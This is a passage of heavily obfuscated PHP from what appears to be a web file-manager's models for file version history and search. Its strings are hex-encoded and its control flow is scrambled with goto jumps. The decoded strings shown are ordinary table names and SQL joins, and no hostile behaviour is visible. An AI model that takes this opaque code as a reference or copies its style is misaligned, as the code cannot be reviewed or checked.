CĞŞóâ‹Œ: } public function removeBySource($Cçùµ‘¸«Ü) { $c¹À½ğ¥å = array($_SERVER[¼][380] => $Cçùµ‘¸«Ü); $this->where($c¹À½ğ¥å)->remove(); } } class SourceHistoryModel extends ModelBase { protected $tableName = "\x69\x6f\137\x73\157\165\x72\x63\145\137\150\x69\163\164\x6f\162\171"; public function addHistory($CãÚï´ ¼Ö, $B˜´ÏÁÏòî = '') { $b ó…ï—¬× =& $_SERVER[¼]; $cî‰ç³¡ïœ = array($b ó…ï—¬×[380] => $CãÚï´ ¼Ö[$b ó…ï—¬×[366]], $b ó…ï—¬×[1395] => isset($CãÚï´ ¼Ö[$b ó…ï—¬×[376]]) ? $CãÚï´ ¼Ö[$b ó…ï—¬×[376]] : $CãÚï´ ¼Ö[$b ó…ï—¬×[375]], $b ó…ï—¬×[416] => $CãÚï´ ¼Ö[$b ó…ï—¬×[415]], $b ó…ï—¬×[516] => $CãÚï´ ¼Ö[$b ó…ï—¬×[77]], $b ó…ï—¬×[2252] => $B˜´ÏÁÏòî); $dÚ£ÇÁâ = $GLOBALS[$b ó…ï—¬×[6]][$b ó…ï—¬×[84]][$b ó…ï—¬×[2253]]; if ($dÚ£ÇÁâ > 1) { $this->historyAutoClear($cî‰ç³¡ïœ[$b ó…ï—¬×[366]]); $this->add($cî‰ç³¡ïœ); } Model($b ó…ï—¬×[2254])->eventFileEdit($CãÚï´ ¼Ö[$b ó…ï—¬×[366]]); } private function historyAutoClear($C„–¼ƒˆß¤) { goto BÏåÛß´îÅ; BÏåÛß´îÅ: $Fƒ†¢³î‡ =& $_SERVER[¼]; $FŞ­îÕ‚Ã¼ = Model($Fƒ†¢³î‡[1081])->get($Fƒ†¢³î‡[2255]); $b›ŒòÌÃã™ = $GLOBALS[$Fƒ†¢³î‡[6]][$Fƒ†¢³î‡[84]][$Fƒ†¢³î‡[2253]]; goto cõ©«£‹’’; fİ¼äĞ: $DÛÁÓ†Óøƒ = array($Fƒ†¢³î‡[382] => array($Fƒ†¢³î‡[7], $CÚ«çÅ‰Ø)); $this->where($DÛÁÓ†Óøƒ)->delete(); Model($Fƒ†¢³î‡[418])->remove($A†µê²Üµ÷); goto CÃ—¥°ˆğä; eÄ›½œŒ í: if (!$aåæŒ­½¤ù || $E‚ê“‘‘ó… >= count($aåæŒ­½¤ù)) { return; } $CÚ«çÅ‰Ø = array_to_keyvalue($aåæŒ­½¤ù, $Fƒ†¢³î‡[33], $Fƒ†¢³î‡[364]); $CÚ«çÅ‰Ø = array_slice($CÚ«çÅ‰Ø, $E‚ê“‘‘ó…); goto eÌÅ†ÓÁ“‹; eèªä·Äİ—: if ($E‚ê“‘‘ó… >= 500) { return; } $DÛÁÓ†Óøƒ = array($Fƒ†¢³î‡[380] => $C„–¼ƒˆß¤); $aåæŒ­½¤ù = $this->field($Fƒ†¢³î‡[2257])->where($DÛÁÓ†Óøƒ)->order($Fƒ†¢³î‡[2249])->select(); goto eÄ›½œŒ í; cõ©«£‹’’: $aÒ¥­¥öŸ´ = $FŞ­îÕ‚Ã¼ == $Fƒ†¢³î‡[2256] ? 3 : $b›ŒòÌÃã™; if ($b›ŒòÌÃã™ <= 1) { $aÒ¥­¥öŸ´ = 1; } $E‚ê“‘‘ó… = $aÒ¥­¥öŸ´ - 1; goto eèªä·Äİ—; eÌÅ†ÓÁ“‹: $A†µê²Üµ÷ = array_to_keyvalue($aåæŒ­½¤ù, $Fƒ†¢³î‡[33], $Fƒ†¢³î‡[415]); $A†µê²Üµ÷ = array_slice($A†µê²Üµ÷, $E‚ê“‘‘ó…); if (!$CÚ«çÅ‰Ø || !$A†µê²Üµ÷) { return; } goto fİ¼äĞ; CÃ—¥°ˆğä: } public function listData($E§ºŠÈ”×Î) { goto cÆï´°ö•; AŸÜ¿Å°â²: $EÀÏÓ“—®… = 3; if ($CÀÅêÕÒÃ¼ == $dœë¦éÍ[2256]) { $A˜‹Øˆ¶¾[$dœë¦éÍ[351]] = array_slice($A˜‹Øˆ¶¾[$dœë¦éÍ[351]], 0, $EÀÏÓ“—®…); $A˜‹Øˆ¶¾[$dœë¦éÍ[348]] = array($dœë¦éÍ[2259] => 1, $dœë¦éÍ[2260] => 20, $dœë¦éÍ[2261] => 1, $dœë¦éÍ[2262] => count($A˜‹Øˆ¶¾[$dœë¦éÍ[351]])); } return $A˜‹Øˆ¶¾; goto F±‡ƒ…†¤÷; cÆï´°ö•: $dœë¦éÍ =& $_SERVER[¼]; $e£Š°¼„¥ã = array($dœë¦éÍ[380] => $E§ºŠÈ”×Î); $fèá¶ã×Ş‘ = $dœë¦éÍ[2258]; goto e—¬¼—âòø; e—¬¼—âòø: $A˜‹Øˆ¶¾ = $this->field($fèá¶ã×Ş‘)->where($e£Š°¼„¥ã)->order($dœë¦éÍ[2249])->selectPage(); $this->_listAppendUser($A˜‹Øˆ¶¾[$dœë¦éÍ[351]]); $CÀÅêÕÒÃ¼ = Model($dœë¦éÍ[1081])->get($dœë¦éÍ[2255]); goto AŸÜ¿Å°â²; F±‡ƒ…†¤÷: } protected function _listAppendUser(&$C³ã—´ï) { $eƒ—Ì¶óˆš =& $_SERVER[¼]; $E‚‡‘Î–ò = array_to_keyvalue($C³ã—´ï, $eƒ—Ì¶óˆš[33], $eƒ—Ì¶óˆš[1404]); $F×ÍÀÓÆ’Ñ = Model($eƒ—Ì¶óˆš[473])->userListInfo($E‚‡‘Î–ò); foreach ($C³ã—´ï as &$F¶¡Æ½¤’ö) { $c»¡îÈÚê = $F¶¡Æ½¤’ö[$eƒ—Ì¶óˆš[1404]]; $F¶¡Æ½¤’ö[$eƒ—Ì¶óˆš[375]] = $F×ÍÀÓÆ’Ñ[$c»¡îÈÚê] ? $F×ÍÀÓÆ’Ñ[$c»¡îÈÚê] : !1; } } public function fileInfo($dâØ›À ùµ) { $E±¤¤ÄÂ¦· =& $_SERVER[¼]; $Aä”’ò˜ó = $this->tablePrefix; $eöÎÃ îÕ = "{$Aä”’ò˜ó}\151\157\x5f\146\x69\x6c\145\x20\146\151\154\x65\163\x20\x6f\x6e\40\146\151\x6c\x65\x73\56\x66\x69\x6c\x65\x49\104\x20\75\x20\150\x69\163\x74\x6f\162\171\x2e\146\151\x6c\x65\111\104"; return $this->alias($E±¤¤ÄÂ¦·[2263])->where(array($E±¤¤ÄÂ¦·[382] => $dâØ›À ùµ))->join($eöÎÃ îÕ, $E±¤¤ÄÂ¦·[2264])->find(); } public function removeItem($DáÛõø½) { $D¤Ä‡ø½†ã =& $_SERVER[¼]; $cÚ¯ôµ®†ª = array($D¤Ä‡ø½†ã[382] => $DáÛõø½); $D–ÄÜîŒ = $this->where($cÚ¯ôµ®†ª)->find(); if ($D–ÄÜîŒ) { $bÙ³‚½¹ì = $this->where($cÚ¯ôµ®†ª)->delete(); Model($D¤Ä‡ø½†ã[418])->remove($D–ÄÜîŒ[$D¤Ä‡ø½†ã[415]]); return $bÙ³‚½¹ì; } return !1; } public function removeBySource($cøù›š„Ë”) { goto D¥æ³Š¤; DØœÄ™»¤Å: return !0; goto EÙ¢¿Š¤šñ; D¥æ³Š¤: $døŸˆğêÂ¿ =& $_SERVER[¼]; if (!$cøù›š„Ë”) { return !1; } if (!is_array($cøù›š„Ë”)) { $cøù›š„Ë” = array($cøù›š„Ë”); } goto EøƒæËª±; EøƒæËª±: $Dç§‰†ÏÅ  = array($døŸˆğêÂ¿[380] => array($døŸˆğêÂ¿[7], $cøù›š„Ë”)); $d­Õ¸”Ÿµâ = $this->field($døŸˆğêÂ¿[416])->where($Dç§‰†ÏÅ )->select(); if ($d­Õ¸”Ÿµâ) { $this->where($Dç§‰†ÏÅ )->delete(); $añŒå‰âÀò = array_to_keyvalue($d­Õ¸”Ÿµâ, $døŸˆğêÂ¿[33], $døŸˆğêÂ¿[415]); Model($døŸˆğêÂ¿[418])->remove($añŒå‰âÀò); } goto DØœÄ™»¤Å; EÙ¢¿Š¤šñ: } public function setDetail($Có¶¶¸†”, $dÅÔÅÉŞÔ¡) { $d›„öàÄğ =& $_SERVER[¼]; return $this->where(array($d›„öàÄğ[382] => $Có¶¶¸†”))->save(array($d›„öàÄğ[2252] => $dÅÔÅÉŞÔ¡)); } public function rollbackToItem($Cªºè¤š™Ü, $D‘•±§²í‹) { goto B”…®¥Ø—…; A ¨Ïñ†¤: $aòË˜Ì— ¬ = $this->find($D‘•±§²í‹); $E«±±Ñ¸ÍÜ = array($b…°àÂ‰†[415] => $aòË˜Ì— ¬[$b…°àÂ‰†[415]], $b…°àÂ‰†[77] => $aòË˜Ì— ¬[$b…°àÂ‰†[77]], $b…°àÂ‰†[107] => time(), $b…°àÂ‰†[376] => USER_ID); Model($b…°àÂ‰†[744])->where(array($b…°àÂ‰†[366] => $Cªºè¤š™Ü))->save($E«±±Ñ¸ÍÜ); goto Fé™¿ø¬Í™; Fé™¿ø¬Í™: return $this->where(array($b…°àÂ‰†[382] => $D‘•±§²í‹))->delete(); goto B¾´¢‘Ó¤˜; B”…®¥Ø—…: $b…°àÂ‰† =& $_SERVER[¼]; $d£Ãæ­…Á = Model($b…°àÂ‰†[744])->sourceInfo($Cªºè¤š™Ü); $this->addHistory($d£Ãæ­…Á); goto A ¨Ïñ†¤; B¾´¢‘Ó¤˜: } public function clearSame($EÑŒ÷…¶ÜÕ) { goto d›‚İˆéÙ; d›‚İˆéÙ: $E´ºÈ Ş’› =& $_SERVER[¼]; $DôƒİíÜ’‡ = $this->listData($EÑŒ÷…¶ÜÕ); $eê—™»ö÷Ô = array_to_keyvalue_group($DôƒİíÜ’‡, $E´ºÈ Ş’›[415]); goto EÔ­ï…†è‚; fˆğ¼ë¡À“: if (!$Eè‰­ÇÏÈœ) { return; } $this->where(array($E´ºÈ Ş’›[364] => array($E´ºÈ Ş’›[7], $Eè‰­ÇÏÈœ)))->delete(); Model($E´ºÈ Ş’›[418])->remove($A Œ¯œƒå…); goto bÜé°á¯èÍ; EÔ­ï…†è‚: $A Œ¯œƒå… = array(); $Eè‰­ÇÏÈœ = array(); foreach ($eê—™»ö÷Ô as $EÎ‹º–Š¹ç) { if (!$EÎ‹º–Š¹ç || count($EÎ‹º–Š¹ç) <= 1) { continue; } foreach ($EÎ‹º–Š¹ç as $c…ñ‚ùŞÚà) { $A Œ¯œƒå…[] = $c…ñ‚ùŞÚà[$E´ºÈ Ş’›[415]]; $Eè‰­ÇÏÈœ[] = $c…ñ‚ùŞÚà[$E´ºÈ Ş’›[364]]; } } goto fˆğ¼ë¡À“; bÜé°á¯èÍ: } public function userSpace() { $a»Ø›ã…‰ç =& $_SERVER[¼]; $F‡»¸ˆ°ª„ = $this->tablePrefix; $d‰¢†Ê‘İÇ = array($a»Ø›ã…‰ç[1395] => USER_ID); $e©ÖĞÊÊİ = "{$F‡»¸ˆ°ª„}\151\157\137\x66\151\x6c\x65\40\x66\x69\x6c\145\x73\x20\x6f\x6e\40\x66\151\x6c\145\163\56\146\151\154\145\x49\104\x20\x3d\x20\x68\x69\x73\164\x6f\162\171\x2e\146\151\x6c\x65\x49\x44"; return $this->alias($a»Ø›ã…‰ç[2263])->where($d‰¢†Ê‘İÇ)->join($e©ÖĞÊÊİ, $a»Ø›ã…‰ç[2264])->sum($a»Ø›ã…‰ç[77]); } } class SourceListSearchModel extends SourceListMoveModel { public static function fileTypeWhere($BÅÄ…¢…İ) { goto B¯«–á”¶¶; AÄ†¯¾Ó¯: if (!$e°ºØƒÔ”È[$f³»•§¢Õš[157]]) { $dÛ¶…’½§‹ = array_to_keyvalue($CèƒÕ”¹Ü‡, $f³»•§¢Õš[33], $f³»•§¢Õš[157]); $A¦àÜÀôŒÍ = implode($f³»•§¢Õš[47], $dÛ¶…’½§‹); $Cº³†ãøÒÌ = $f³»•§¢Õš[2221]; } $fŠÓì¬”Á’ = explode($f³»•§¢Õš[47], trim($A¦àÜÀôŒÍ, $f³»•§¢Õš[47])); return array($Cº³†ãøÒÌ, $fŠÓì¬”Á’); goto aÇñ‚ë«˜¬; B¯«–á”¶¶: $f³»•§¢Õš =& $_SERVER[¼]; $CèƒÕ”¹Ü‡ = KodIO::fileTypeList(); $e°ºØƒÔ”È = $CèƒÕ”¹Ü‡[$BÅÄ…¢…İ]; goto DÔº°¨Ó£Ÿ; DÔº°¨Ó£Ÿ: if (!$e°ºØƒÔ”È) { return array(); } $A¦àÜÀôŒÍ = $e°ºØƒÔ”È[$f³»•§¢Õš[157]]; $Cº³†ãøÒÌ = $f³»•§¢Õš[7]; goto AÄ†¯¾Ó¯; aÇñ‚ë«˜¬: } public function listPathType($cğËåĞê§) { $E¸…ìß®œñ =& $_SERVER[¼]; $BÊˆ£òºÛ = $this->fileTypeWhere($cğËåĞê§); if (!$BÊˆ£òºÛ) { return array(); } $dßÚÇ´›µ¡ = array($E¸…ìß®œñ[517] => SourceModel::TYPE_USER, $E¸…ìß®œñ[518] => USER_ID, $E¸…ìß®œñ[514] => 0, $E¸…ìß®œñ[515] => $BÊˆ£òºÛ); return $this->listSource($dßÚÇ´›µ¡); } public function listSearch($aÎ¯Ø±â‡—, $f«Š‚Œß£× = 300) { goto B“½âÕí¬¨; a³Õ›¸ä•ª: $this->_listMake($Eø…àÔè©); return $Eø…àÔè©; goto C–ÜµÕ©×Â; bˆº“Ğ•¹‚: if (!isset($DéĞÅÅ‚ô[$eÆÚğ»Ôˆê[393]])) { $DéĞÅÅ‚ô[$eÆÚğ»Ôˆê[393]] = 0; } $E×ëİ‹ÊÎ = $eÆÚğ»Ôˆê[2266]; $EÑŸ†½Œ‚¤ = $E×ëİ‹ÊÎ; goto aôÀ…¥ºè‘; B“½âÕí¬¨: $eÆÚğ»Ôˆê =& $_SERVER[¼]; if (isset($aÎ¯Ø±â‡—[$eÆÚğ»Ôˆê[2143]]) && $aÎ¯Ø±â‡—[$eÆÚğ»Ôˆê[2143]]) { $aÎ¯Ø±â‡—[$eÆÚğ»Ôˆê[2143]] = str_replace($eÆÚğ»Ôˆê[1556], $eÆÚğ»Ôˆê[2265], trim($aÎ¯Ø±â‡—[$eÆÚğ»Ôˆê[2143]])); } $DéĞÅÅ‚ô = $this->_parseSearchWhere($aÎ¯Ø±â‡—); goto bˆº“Ğ•¹‚; aôÀ…¥ºè‘: $this->_listSearchBindPinyin($aÎ¯Ø±â‡—, $DéĞÅÅ‚ô, $E×ëİ‹ÊÎ); $this->alias($eÆÚğ»Ôˆê[483])->_makeOrder()->cache(null, 10); $Eø…àÔè© = $this->distinct(!0)->field($E×ëİ‹ÊÎ)->where($DéĞÅÅ‚ô)->selectPage($f«Š‚Œß£×); goto FÔæ²ÜØÄå; FÔæ²ÜØÄå: $this->_listSearchDesc($Eø…àÔè©, $aÎ¯Ø±â‡—, $EÑŸ†½Œ‚¤); $this->_listSearchTag($Eø…àÔè©, $aÎ¯Ø±â‡—, $EÑŸ†½Œ‚¤); $this->_listDataApply($Eø…àÔè©[$eÆÚğ»Ôˆê[351]]); goto a³Õ›¸ä•ª; C–ÜµÕ©×Â: } private function _listSearchTag(&$c·ìÂÚÍÄŸ, $eèÜÉÁÉçÔ, $b†¼ƒ¯Î¦Ç) { goto B¾òÁ±Ïãé; a‹¬ç²¤ˆÅ: $aµ¬Ğ½©–è = array(); $Eëó·±ñÉ¯ = $eèÜÉÁÉçÔ[$eÃ‰ªÒ Š­[2143]]; foreach ($dìµ„ã…î as $a„”©Œ¢ùÍ) { $f²Şôß§ÖØ = $a„”©Œ¢ùÍ[$eÃ‰ªÒ Š­[28]]; $dÙÖ„¨¡Ã¨ = str_replace($eÃ‰ªÒ Š­[50], $eÃ‰ªÒ Š­[33], Pinyin::encode($f²Şôß§ÖØ)); if (stripos($f²Şôß§ÖØ, $Eëó·±ñÉ¯) !== !1 || stripos($dÙÖ„¨¡Ã¨, $Eëó·±ñÉ¯) !== !1) { $aµ¬Ğ½©–è[] = $a„”©Œ¢ùÍ[$eÃ‰ªÒ Š­[364]]; } } goto cÙØÊ‡‚Åá; Dœ‚šˆçÛ›: $d‚ô‰ÉœÉê = array_to_keyvalue($d‚ô‰ÉœÉê, $eÃ‰ªÒ Š­[33], $eÃ‰ªÒ Š­[75]); $Bœ¾×·›İŠ = array_unique($d‚ô‰ÉœÉê); $this->_listSearchMerge($c·ìÂÚÍÄŸ, $eèÜÉÁÉçÔ, $b†¼ƒ¯Î¦Ç, $Bœ¾×·›İŠ); goto b–ºĞ»…ù…; B¾òÁ±Ïãé: $eÃ‰ªÒ Š­ =& $_SERVER[¼]; if (!$eèÜÉÁÉçÔ[$eÃ‰ªÒ Š­[2143]] || $c·ìÂÚÍÄŸ[$eÃ‰ªÒ Š­[348]][$eÃ‰ªÒ Š­[337]] > 1) { return; } $dìµ„ã…î = Model($eÃ‰ªÒ Š­[2267])->listData(); goto a‹¬ç²¤ˆÅ; cÙØÊ‡‚Åá: if (!$aµ¬Ğ½©–è) { return; } $A˜—ËÔ†àé = array($eÃ‰ªÒ Š­[390] => array($eÃ‰ªÒ Š­[7], $aµ¬Ğ½©–è)); $d‚ô‰ÉœÉê = Model($eÃ‰ªÒ Š­[2268])->field($eÃ‰ªÒ Š­[75])->where($A˜—ËÔ†àé)->select(); goto Dœ‚šˆçÛ›; b–ºĞ»…ù…: } private function _listSearchDesc(&$FŞë©äõ™á, $b“†ÚÊ£½¬, $eœ‹¢Î¨…·) { goto a¡å’»¾‚ó; a¡å’»¾‚ó: $CŸƒÃ˜¨é¢ =& $_SERVER[¼]; if (!$b“†ÚÊ£½¬[$CŸƒÃ˜¨é¢[2143]] || $FŞë©äõ™á[$CŸƒÃ˜¨é¢[348]][$CŸƒÃ˜¨é¢[337]] > 1) { return; } $F„ÀÆİ¾Ó™ = $this->listSearchChildren($b“†ÚÊ£½¬[$CŸƒÃ˜¨é¢[457]]); goto B–Šô‚´¿; B–Šô‚´¿: $F„ÀÆİ¾Ó™ = array_unique($F„ÀÆİ¾Ó™); if (!$F„ÀÆİ¾Ó™) { return; } $C…ÎÆ©“‡ˆ = array($CŸƒÃ˜¨é¢[366] => array($CŸƒÃ˜¨é¢[7], $F„ÀÆİ¾Ó™), $CŸƒÃ˜¨é¢[89] => $CŸƒÃ˜¨é¢[401], $CŸƒÃ˜¨é¢[356] => array($CŸƒÃ˜¨é¢[743], $CŸƒÃ˜¨é¢[2145] . $b“†ÚÊ£½¬[$CŸƒÃ˜¨é¢[2143]] . $CŸƒÃ˜¨é¢[2145])); goto béàÆäÜ; béàÆäÜ: $EÜ¢½›ªˆ£ = Model($CŸƒÃ˜¨é¢[500])->field($CŸƒÃ˜¨é¢[366])->where($C…ÎÆ©“‡ˆ)->select(); $fÛ¢­ „¡ç = array_to_keyvalue($EÜ¢½›ªˆ£, $CŸƒÃ˜¨é¢[33], $CŸƒÃ˜¨é¢[366]); $this->_listSearchMerge($FŞë©äõ™á, $b“†ÚÊ£½¬, $eœ‹¢Î¨…·, $fÛ¢­ „¡ç); goto f´İš·ƒ¦Ñ; f´İš·ƒ¦Ñ: } private function _listSearchMerge(&$Fî§—è„²æ, $F·¥‚ŸÄ, $b¥™Î÷”Ú§, $AÃëëçİ¬) { goto Eª¿”©•¡¾; D„¦µ„ƒ¼˜: foreach ($cğŒğÇµßŞ as $dÑÚùô) { $A ‡×ïËø‚ = $D©¬Ú¸ ‚Ì[47] . $F·¥‚ŸÄ[$D©¬Ú¸ ‚Ì[457]] . $D©¬Ú¸ ‚Ì[47]; if (stripos($dÑÚùô[$D©¬Ú¸ ‚Ì[455]], $A ‡×ïËø‚) !== !1) { $A‹¦ß´–¼[] = $dÑÚùô; } } $Fî§—è„²æ[$D©¬Ú¸ ‚Ì[351]] = array_merge($A‹¦ß´–¼, $Fî§—è„²æ[$D©¬Ú¸ ‚Ì[351]]); $Fî§—è„²æ[$D©¬Ú¸ ‚Ì[348]][$D©¬Ú¸ ‚Ì[349]] += count($A‹¦ß´–¼); goto B¾†ˆ¾…®; e±º½ªÀ: $cğŒğÇµßŞ = $this->field($b¥™Î÷”Ú§)->where($BÓÓ¾À„Ú)->select(); if (!$cğŒğÇµßŞ) { return; } $A‹¦ß´–¼ = array(); goto D„¦µ„ƒ¼˜; Eª¿”©•¡¾: $D©¬Ú¸ ‚Ì =& $_SERVER[¼]; if (!$AÃëëçİ¬) { return; } $E­Œ˜Ò¡Ã• = array_to_keyvalue($Fî§—è„²æ[$D©¬Ú¸ ‚Ì[351]], $D©¬Ú¸ ‚Ì[33], $D©¬Ú¸ ‚Ì[366]); goto dÀÇÎº¨‹; dÀÇÎº¨‹: $a´È¸ïò‚é = array_diff($AÃëëçİ¬, $E­Œ˜Ò¡Ã•); if (!$a´È¸ïò‚é) { return; } $BÓÓ¾À„Ú = array($D©¬Ú¸ ‚Ì[366] => array($D©¬Ú¸ ‚Ì[7], $a´È¸ïò‚é)); goto e±º½ªÀ; B¾†ˆ¾…®: } public function listSearchChildren($C’¦ ¢¨‚», $b®Ú¸„•» = 5000) { goto EÕŒªÑíƒ; EÕŒªÑíƒ: $c¹‚«Ÿ =& $_SERVER[¼]; $Eâ‹¡ö»ˆ = array(); $dšñäº„Ûù = $this->sourceInfo($C’¦ ¢¨‚»); goto b©†­ó·£Œ; E¯‡Ò¬¢ÌÉ: $AĞÇ”±çÓÂ = $this->field($c¹‚«Ÿ[366])->where($bÈ¢‹åÑñ£)->select(); $Eâ‹¡ö»ˆ = array_to_keyvalue($AĞÇ”±çÓÂ, $c¹‚«Ÿ[33], $c¹‚«Ÿ[366]); return $Eâ‹¡ö»ˆ; goto e¸·Çöô¿Í; b©†­ó·£Œ: $bÈ¢‹åÑñ£ = array($c¹‚«Ÿ[455] => array($c¹‚«Ÿ[743], $dšñäº„Ûù[$c¹‚«Ÿ[455]] . $dšñäº„Ûù[$c¹‚«Ÿ[366]] . $c¹‚«Ÿ[480])); $F¨ØÓ¨»† = $this->field($c¹‚«Ÿ[366])->cache(null, 600)->where($bÈ¢‹åÑñ£)->count(); if ($F¨ØÓ¨»† > $b®Ú¸„•») { return $this->_listSearchChildrenNear($C’¦ ¢¨‚», $b®Ú¸„•»); } goto E¯‡Ò¬¢ÌÉ; e¸·Çöô¿Í: } private function _listSearchChildrenNear($BÄæŠÕŞâé, $fñæ¤°‡ÂÕ) { goto A¹ÃÆ÷³; fˆÈìÓéÒÂ: $F…é“ÚÂáÔ = array_merge($F…é“ÚÂáÔ, array_to_keyvalue($b§ì®àÔÅõ, $dŠ»Ú‘Ú””[33], $dŠ»Ú‘Ú””[366])); $F…é“ÚÂáÔ = array_slice($F…é“ÚÂáÔ, 0, $fñæ¤°‡ÂÕ); return $F…é“ÚÂáÔ; goto a°¿Ğßì¯í; fíîáÖñ±í: $b§ì®àÔÅõ = $this->field($dŠ»Ú‘Ú””[2269])->where($fªåÌÜÁµ‘)->select(); $b—¬¶¼õÄˆ = array_to_keyvalue(array_filter_by_field($b§ì®àÔÅõ, $dŠ»Ú‘Ú””[367], $dŠ»Ú‘Ú””[83]), $dŠ»Ú‘Ú””[33], $dŠ»Ú‘Ú””[366]); $F…é“ÚÂáÔ = array_merge($F…é“ÚÂáÔ, array_to_keyvalue($b§ì®àÔÅõ, $dŠ»Ú‘Ú””[33], $dŠ»Ú‘Ú””[366])); goto F‰Ÿ¶•—¹Ÿ; F‰Ÿ¶•—¹Ÿ: if (!$b—¬¶¼õÄˆ) { return $F…é“ÚÂáÔ; } $fªåÌÜÁµ‘ = array($dŠ»Ú‘Ú””[457] => array($dŠ»Ú‘Ú””[7], $b—¬¶¼õÄˆ)); $b§ì®àÔÅõ = $this->field($dŠ»Ú‘Ú””[2269])->where($fªåÌÜÁµ‘)->select(); goto fˆÈìÓéÒÂ; A¹ÃÆ÷³: $dŠ»Ú‘Ú”” =& $_SERVER[¼]; $F…é“ÚÂáÔ = array(); $fªåÌÜÁµ‘ = array($dŠ»Ú‘Ú””[457] => $BÄæŠÕŞâé); goto fíîáÖñ±í; a°¿Ğßì¯í: } private function _listSearchBindPinyin($e¿’ôĞïŸ§, &$c¥Ë†­ à, &$C„õÕ·œİâ) { goto Fšîò‘œ”; fÎéŒÔÊŒÔ: $aöµìÔ«Ÿ» = array(); $C„õÕ·œİâ = str_replace(array($bÀ²ãëÃí[214], $bÀ²ãëÃí[50], $bÀ²ãëÃí[2270]), $bÀ²ãëÃí[33], $C„õÕ·œİâ); $C„õÕ·œİâ = $bÀ²ãëÃí[2271] . str_replace($bÀ²ãëÃí[47], $bÀ²ãëÃí[2272], $C„õÕ·œİâ); goto B˜í¤ ¨Ô©; B˜í¤ ¨Ô©: unset($c¥Ë†­ à[$bÀ²ãëÃí[28]]); foreach ($c¥Ë†­ à as $b´‹Ó­¯Õƒ => $AÆÅÇ´§¼) { $aöµìÔ«Ÿ»[$bÀ²ãëÃí[2271] . $b´‹Ó­¯Õƒ] = $AÆÅÇ´§¼; } $Eğ®¸ö = array($bÀ²ãëÃí[479], $bÀ²ãëÃí[2145] . $e¿’ôĞïŸ§[$bÀ²ãëÃí[2143]] . $bÀ²ãëÃí[2145]); goto Eï¹‹ôÇ›Œ; Eï¹‹ôÇ›Œ: $aöµìÔ«Ÿ»[] = array($bÀ²ãëÃí[2273] => $Eğ®¸ö, $bÀ²ãëÃí[909] => $bÀ²ãëÃí[2147], array($bÀ²ãëÃí[2274] => $Eğ®¸ö, $bÀ²ãëÃí[2275] => array($bÀ²ãëÃí[7], array($bÀ²ãëÃí[412], $bÀ²ãëÃí[411])))); $this->join($aÊ«ÊŸ§à³); $c¥Ë†­ à = $aöµìÔ«Ÿ»; goto BÛœ–Ù³; Fšîò‘œ”: $bÀ²ãëÃí =& $_SERVER[¼]; if (!Input::check($e¿’ôĞïŸ§[$bÀ²ãëÃí[2143]], $bÀ²ãëÃí[303]) || strlen($e¿’ôĞïŸ§[$bÀ²ãëÃí[2143]]) < 2) { return; } $aÊ«ÊŸ§à³ = "\114\105\x46\124\40\112\117\x49\x4e\40{$this->tablePrefix}\x69\x6f\x5f\x73\157\165\x72\x63\145\137\x6d\x65\x74\141\40\155\145\x74\x61\x20\157\156\40\x73\157\165\x72\x63\145\x2e\x73\157\165\x72\143\x65\111\104\40\x3d\x20\x6d\145\x74\x61\x2e\x73\157\x75\162\143\x65\111\x44"; goto fÎéŒÔÊŒÔ; BÛœ–Ù³: } private function _parseSearchWhere($aÀÌ™ğèªœ) { goto bËäÖ–êˆË; bËäÖ–êˆË: $Eéé¬èŠ¼ =& $_SERVER[¼]; $a¶¦“ÊôÉ = array(); if (isset($aÀÌ™ğèªœ[$Eéé¬èŠ¼[694]])) { $a¶¦“ÊôÉ[$Eéé¬èŠ¼[107]] = array($Eéé¬èŠ¼[2276], $aÀÌ™ğèªœ[$Eéé¬èŠ¼[694]]); } goto c–·»ÖÊöœ; c–·»ÖÊöœ: if (isset($aÀÌ™ğèªœ[$Eéé¬èŠ¼[695]])) { $e‡õ—…„ = array($Eéé¬èŠ¼[2277], $aÀÌ™ğèªœ[$Eéé¬èŠ¼[695]]); if ($a¶¦“ÊôÉ[$Eéé¬èŠ¼[107]]) { $a¶¦“ÊôÉ[$Eéé¬èŠ¼[107]] = array($a¶¦“ÊôÉ[$Eéé¬èŠ¼[107]], $e‡õ—…„, $Eéé¬èŠ¼[2278]); } else { $a¶¦“ÊôÉ[$Eéé¬èŠ¼[107]] = $e‡õ—…„; } } if (isset($aÀÌ™ğèªœ[$Eéé¬èŠ¼[2279]])) { $a¶¦“ÊôÉ[$Eéé¬èŠ¼[77]] = array($Eéé¬èŠ¼[2276], $aÀÌ™ğèªœ[$Eéé¬èŠ¼[2279]]); } if (isset($aÀÌ™ğèªœ[$Eéé¬èŠ¼[2280]])) { $e‡õ—…„ = array($Eéé¬èŠ¼[2277], $aÀÌ™ğèªœ[$Eéé¬èŠ¼[2280]]); if ($a¶¦“ÊôÉ[$Eéé¬èŠ¼[77]]) { $a¶¦“ÊôÉ[$Eéé¬èŠ¼[77]] = array($a¶¦“ÊôÉ[$Eéé¬èŠ¼[77]], $e‡õ—…„, $Eéé¬èŠ¼[2278]); } else { $a¶¦“ÊôÉ[$Eéé¬èŠ¼[77]] = $e‡õ—…„; } } goto Aï·«²‹Âæ; Aï·«²‹Âæ: if (isset($aÀÌ™ğèªœ[$Eéé¬èŠ¼[531]])) { $a¶¦“ÊôÉ[] = array($Eéé¬èŠ¼[376] => $aÀÌ™ğèªœ[$Eéé¬èŠ¼[531]], $Eéé¬èŠ¼[375] => $aÀÌ™ğèªœ[$Eéé¬èŠ¼[531]], $Eéé¬èŠ¼[909] => $Eéé¬èŠ¼[2147]); } if (isset($aÀÌ™ğèªœ[$Eéé¬èŠ¼[369]])) { $CÂ•ÎÑÃ = $aÀÌ™ğèªœ[$Eéé¬èŠ¼[369]]; if ($CÂ•ÎÑÃ == $Eéé¬èŠ¼[76]) { $a¶¦“ÊôÉ[$Eéé¬èŠ¼[367]] = 1; } else { if ($CÂ•ÎÑÃ == $Eéé¬èŠ¼[2281]) { $a¶¦“ÊôÉ[$Eéé¬èŠ¼[367]] = 0; } else { if ($CÂ•ÎÑÃ) { $CÂ•ÎÑÃ = is_array($CÂ•ÎÑÃ) ? $CÂ•ÎÑÃ : explode($Eéé¬èŠ¼[47], $CÂ•ÎÑÃ); $a¶¦“ÊôÉ[$Eéé¬èŠ¼[369]] = array($Eéé¬èŠ¼[381], $CÂ•ÎÑÃ); $a¶¦“ÊôÉ[$Eéé¬èŠ¼[367]] = 0; } } } } if (isset($aÀÌ™ğèªœ[$Eéé¬èŠ¼[457]])) { $D‰­¹˜¦’ = $this->sourceInfo($aÀÌ™ğèªœ[$Eéé¬èŠ¼[457]]); $a¶¦“ÊôÉ[$Eéé¬èŠ¼[521]] = array($Eéé¬èŠ¼[479], 